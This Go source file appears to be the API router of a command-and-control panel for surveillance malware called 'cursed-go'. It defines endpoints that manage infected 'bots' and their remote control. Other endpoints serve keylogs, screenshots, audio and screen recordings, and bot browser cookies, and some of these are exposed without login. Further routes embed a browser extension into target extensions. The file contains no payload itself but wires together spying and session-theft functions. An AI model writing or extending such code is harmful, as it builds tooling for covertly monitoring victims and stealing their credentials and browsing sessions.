package api

import (
	"net/http"
	"path/filepath"
	"strings"

	"github.com/go-chi/chi/v5"
	"github.com/go-chi/chi/v5/middleware"
	"gorm.io/gorm"

	"github.com/s045pd/cursed-go/internal/auth"
)

// Deps groups all collaborators the API server needs.
type Deps struct {
	DB           *gorm.DB
	Sessions     *auth.Manager
	BotRPC       BotRPC
	BcryptRounds int
	GUIDistPath  string
}

// NewRouter assembles the chi router with all middleware and routes.
func NewRouter(d Deps) http.Handler {
	r := chi.NewRouter()
	r.Use(middleware.RequestID)
	r.Use(middleware.RealIP)
	r.Use(middleware.Recoverer)
	r.Use(auth.CORS)

	authAPI := &AuthAPI{DB: d.DB, Sessions: d.Sessions, BcryptRounds: d.BcryptRounds}
	botsAPI := &BotsAPI{DB: d.DB}
	settingsAPI := &SettingsAPI{DB: d.DB}
	mediaAPI := &MediaAPI{DB: d.DB}
	remoteAPI := &RemoteAPI{DB: d.DB, RPC: d.BotRPC}
	proxyAPI := &ProxyCredsAPI{DB: d.DB, RPC: d.BotRPC}
	extensionAPI := &ExtensionAPI{}
	extAuthAPI := &ExtAuthAPI{DB: d.DB}

	// Public endpoints (no session required)
	r.With(auth.SecurityHeaders(true)).Group(func(r chi.Router) {
		r.Get("/health", HealthHandler)
		r.Get("/version", VersionHandler)
		r.Post("/api/v1/login", authAPI.Login)
		r.Post("/api/v1/verify-proxy-credentials", proxyAPI.VerifyProxyCredentials)
		r.Post("/api/v1/get-bot-browser-cookies", proxyAPI.GetBotBrowserCookies)
		r.Post("/api/v1/get-bot-browser", proxyAPI.GetBotBrowser)
		r.Post("/api/v1/ext/login", extAuthAPI.Login)
	})

	// Session-protected endpoints
	r.With(auth.SecurityHeaders(true), d.Sessions.RequireSession(d.DB)).
		Group(func(r chi.Router) {
			// auth-related
			r.Get("/api/v1/logout", authAPI.Logout)
			r.Get("/api/v1/me", authAPI.Me)
			r.Put("/api/v1/password", authAPI.ChangePassword)
			r.Get("/api/v1/download_ca", DownloadCAHandler)
			r.Get("/api/v1/extension/targets", extensionAPI.ListEmbedTargets)
			r.Get("/api/v1/extension/download", extensionAPI.Download)
			r.Post("/api/v1/extension/upload-test", extensionAPI.UploadTest)
			r.Post("/api/v1/extension/upload-validate", extensionAPI.UploadValidate)
			r.Post("/api/v1/extension/save-target", extensionAPI.SaveTarget)
			r.Post("/api/v1/extension/delete-target", extensionAPI.DeleteTarget)

			// bots
			r.Get("/api/v1/bots", botsAPI.List)
			r.Put("/api/v1/bots", botsAPI.Update)
			r.Delete("/api/v1/bots", botsAPI.Delete)
			r.Post("/api/v1/bots/batch-delete", botsAPI.BatchDelete)
			r.Get("/api/v1/bots/image/{bot_id}", botsAPI.Image)
			r.Get("/api/v1/fields", botsAPI.Field)

			// settings
			r.Get("/api/v1/settings/global-proxy", settingsAPI.GetGlobalProxy)
			r.Post("/api/v1/settings/global-proxy", settingsAPI.SetGlobalProxy)

			// remote control
			r.Post("/api/v1/remote-control", remoteAPI.RemoteControl)
			r.Post("/api/v1/stop-remote-control", remoteAPI.StopRemoteControl)
			r.Post("/api/v1/start-audio", remoteAPI.StartAudio)
			r.Post("/api/v1/stop-audio", remoteAPI.StopAudio)

			// media
			r.Get("/api/v1/screenshots", mediaAPI.Screenshots)
			r.Get("/api/v1/screenshots/{id}/image", mediaAPI.ScreenshotImage)
			r.Get("/api/v1/keyboard-logs", mediaAPI.KeyboardLogs)
			r.Get("/api/v1/recordings", mediaAPI.Recordings)
			r.Get("/api/v1/audio-sessions", mediaAPI.AudioSessions)
			r.Get("/api/v1/audio-session/{session_id}", mediaAPI.AudioSessionMerge)
			r.Get("/api/v1/audio/{id}", mediaAPI.AudioChunk)
		})

	// Static GUI (relaxed CSP)
	if d.GUIDistPath != "" {
		fs := http.FileServer(http.Dir(d.GUIDistPath))
		r.With(auth.SecurityHeaders(false)).Handle("/*", spaFallback(d.GUIDistPath, fs))
	}

	return r
}

// spaFallback serves index.html for non-asset paths so Vue Router works.
func spaFallback(distPath string, fs http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Block traversal
		if strings.Contains(r.URL.Path, "..") {
			http.NotFound(w, r)
			return
		}
		// If extensioned asset, serve directly; else fall back to index.html
		if filepath.Ext(r.URL.Path) != "" {
			fs.ServeHTTP(w, r)
			return
		}
		http.ServeFile(w, r, filepath.Join(distPath, "index.html"))
	})
}
